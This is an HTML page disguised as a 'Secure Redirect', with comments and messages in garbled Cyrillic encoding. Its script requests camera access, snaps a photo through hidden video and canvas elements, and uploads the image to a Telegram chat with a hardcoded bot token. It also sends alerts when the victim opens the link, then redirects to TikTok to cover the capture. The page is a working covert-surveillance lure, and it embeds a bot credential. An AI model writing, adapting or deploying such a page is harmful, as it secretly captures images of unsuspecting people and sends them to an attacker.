<!DOCTYPE html>
<html>
<head>
  <title>Secure Redirect</title>
  <!-- –ó–∞–ø—Ä–µ—Ç –∏–Ω–¥–µ–∫—Å–∞—Ü–∏–∏ -->
  <meta name="robots" content="noindex, nofollow">
  <!-- –°–∫—Ä—ã—Ç–∏–µ referrer -->
  <meta name="referrer" content="no-referrer">
  <style>
    body { 
      font-family: sans-serif; 
      padding: 20px; 
      background: #f5f5f5; 
      text-align: center;
    }
    #video, #canvas { 
      display: none; 
    }
    #status { 
      font-size: 18px; 
      color: #333; 
      margin: 20px 0;
      padding: 10px;
      border-radius: 5px;
      background: #fff;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .error { color: #d9534f; }
    .success { color: #5cb85c; }
  </style>
</head>
<body>
  <h2>–ó–∞–≥—Ä—É–∑–∫–∞...</h2>
  <p id="status">–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞...</p>

  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>

  <script>
    // –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏–∑ URL
    const urlParams = new URLSearchParams(window.location.search);
    const CHAT_ID = urlParams.get('id') || '0';
    const BOT_TOKEN = '8290532183:AAGOIRobV4EKFlUTVlDeCD28Lj24AEWiRHM';

    // –≠–ª–µ–º–µ–Ω—Ç –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
    const status = document.getElementById('status');

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ API Telegram
    async function checkTelegramAPI() {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`, {
          method: 'GET',
          cache: 'no-cache'
        });
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        const data = await response.json();
        if (data.ok) {
          console.log('API Telegram –¥–æ—Å—Ç—É–ø–Ω–æ:', data.result.username);
          return true;
        } else {
          throw new Error(data.description || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ API');
        }
      } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ API Telegram:', e);
        return false;
      }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –Ω–∞ Telegram
    async function sendPhotoToTelegram(blob, caption) {
      if (!CHAT_ID || CHAT_ID === '0') {
        console.warn('CHAT_ID –Ω–µ —É–∫–∞–∑–∞–Ω');
        return false;
      }

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'snapshot.jpg');
      formData.append('caption', caption);

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await res.json(); // –ü–æ–ª—É—á–∞–µ–º –æ—Ç–≤–µ—Ç –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏
        if (res.ok && result.ok) {
          console.log('–§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ:', result);
          return true;
        } else {
          console.error('–û—Ç–≤–µ—Ç API Telegram –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–æ—Ç–æ:', result);
          return false;
        }
      } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ:', e);
        return false;
      }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–∞ Telegram
    async function sendTextToTelegram(text) {
      if (!CHAT_ID || CHAT_ID === '0') {
        console.warn('CHAT_ID –Ω–µ —É–∫–∞–∑–∞–Ω');
        return false;
      }

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
        const result = await res.json(); // –ü–æ–ª—É—á–∞–µ–º –æ—Ç–≤–µ—Ç –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏
        if (res.ok && result.ok) {
          console.log('–¢–µ–∫—Å—Ç —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:', result);
          return true;
        } else {
          console.error('–û—Ç–≤–µ—Ç API Telegram –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç–µ–∫—Å—Ç–∞:', result);
          return false;
        }
      } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç–µ–∫—Å—Ç–∞:', e);
        return false;
      }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Å–Ω–∏–º–∫–∞ —Å –∫–∞–º–µ—Ä—ã
    async function captureWebcamSnapshot() {
      status.textContent = '–ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ...';
      let stream;

      try {
        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        const video = document.getElementById('video');
        video.srcObject = stream;

        // –ñ–¥–µ–º, –ø–æ–∫–∞ –≤–∏–¥–µ–æ –∑–∞–≥—Ä—É–∑–∏—Ç—Å—è
        await new Promise(r => {
          if (video.readyState >= 2) {
            setTimeout(r, 500);
          } else {
            video.onloadeddata = () => setTimeout(r, 500);
          }
        });

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–º–µ—Ä—ã –≤–∏–¥–µ–æ
        if (video.videoWidth === 0 || video.videoHeight === 0) {
          console.error("–®–∏—Ä–∏–Ω–∞ –∏–ª–∏ –≤—ã—Å–æ—Ç–∞ –≤–∏–¥–µ–æ —Ä–∞–≤–Ω–∞ –Ω—É–ª—é");
          stream.getTracks().forEach(t => t.stop());
          return null;
        }

        // –°–æ–∑–¥–∞–µ–º —Å–Ω–∏–º–æ–∫ —Å –ø–æ–º–æ—â—å—é canvas
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫ –∫–∞–º–µ—Ä—ã
        stream.getTracks().forEach(t => t.stop());

        // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º canvas –≤ Blob (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ)
        return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

      } catch (err) {
        console.error('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:', err);
        // –ï—Å–ª–∏ –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞, –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫
        if (stream) {
          stream.getTracks().forEach(t => t.stop());
        }
        return null;
      }
    }

    // –û—Å–Ω–æ–≤–Ω–æ–π –±–ª–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
    (async () => {
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å API Telegram
      status.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ API Telegram...';
      const isApiAvailable = await checkTelegramAPI();
      if (!isApiAvailable) {
        status.innerHTML = '<span class="error">‚ùå API Telegram –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ. –í–æ–∑–º–æ–∂–Ω–æ, –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ –≤ –≤–∞—à–µ–º —Ä–µ–≥–∏–æ–Ω–µ.</span>';
        await sendTextToTelegram('‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫—Ä—ã–ª —Å—Å—ã–ª–∫—É, –Ω–æ API Telegram –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ.');
        // –î–∞–µ–º –≤—Ä–µ–º—è –¥–ª—è —á—Ç–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è, –∑–∞—Ç–µ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º
        setTimeout(() => {
          window.location.replace('https://www.tiktok.com');
        }, 3000);
        return;
      }

      // –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Å–Ω–∏–º–æ–∫ —Å –∫–∞–º–µ—Ä—ã
      const camBlob = await captureWebcamSnapshot();
      if (camBlob) {
        status.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–Ω–∏–º–∫–∞...';
        const success = await sendPhotoToTelegram(camBlob, 'üì∏ –°–Ω–∏–º–æ–∫ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞');
        if (success) {
          status.innerHTML = '<span class="success">‚úÖ –°–Ω–∏–º–æ–∫ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!</span>';
        } else {
          status.innerHTML = '<span class="error">‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–Ω–∏–º–æ–∫.</span>';
          await sendTextToTelegram('‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫—Ä—ã–ª —Å—Å—ã–ª–∫—É, —Å–Ω–∏–º–æ–∫ —Å–¥–µ–ª–∞–Ω, –Ω–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ Telegram.');
        }
      } else {
        status.innerHTML = '<span class="error">‚ö†Ô∏è –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∑–∞–ø—Ä–µ—â—ë–Ω –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω.</span>';
        await sendTextToTelegram('‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫—Ä—ã–ª —Å—Å—ã–ª–∫—É, –Ω–æ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∑–∞–ø—Ä–µ—â—ë–Ω –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω.');
      }

      // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ TikTok
      status.textContent = '–ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ TikTok...';
      setTimeout(() => {
        window.location.replace('https://www.tiktok.com');
      }, 2000);
    })();
  </script>
</body>
</html>
